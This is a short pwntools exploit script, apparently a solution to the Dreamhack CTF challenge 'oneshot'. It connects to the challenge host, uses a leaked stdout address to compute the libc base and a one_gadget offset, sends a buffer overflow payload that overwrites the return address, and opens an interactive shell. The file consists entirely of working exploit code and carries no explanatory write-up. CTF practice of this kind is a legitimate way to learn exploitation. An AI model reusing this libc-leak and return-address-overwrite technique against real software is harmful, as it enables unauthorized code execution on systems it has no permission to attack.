from pwn import *

# p = process("./oneshot")
# nc host1.dreamhack.games 23506
p = remote("host1.dreamhack.games", 23506)

libc = ELF("./libc.so.6")
# libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")

# one_offset = [0x45226, 0x4527a, 0xf03a4, 0xf1247] # /lib/x86_64-linux-gnu/libc-2.23.so
one_offset = [0x45216, 0x4526a, 0xf02a4, 0xf1147]

# pie_base = p.libs()['/home/leeminjea/Desktop/sf/dreamhack/oneshot/oneshot']

p.recvuntil("stdout: ")

stdout = int(p.recv(14), 16)
libc.address = stdout - libc.symbols["_IO_2_1_stdout_"] #+ pie_base
one_gadget = libc.address + one_offset[0]

log.info("stdout: " + hex(stdout))
log.info("libc.address: " + hex(libc.address))

pay = b""
pay += b"A" * (0x20 - 0x8)
pay += p64(0)
pay += b"B" * 0x8
pay += p64(one_gadget)
# pay += b"X" * 0x8

input()

p.sendafter("MSG: ", pay)


p.interactive()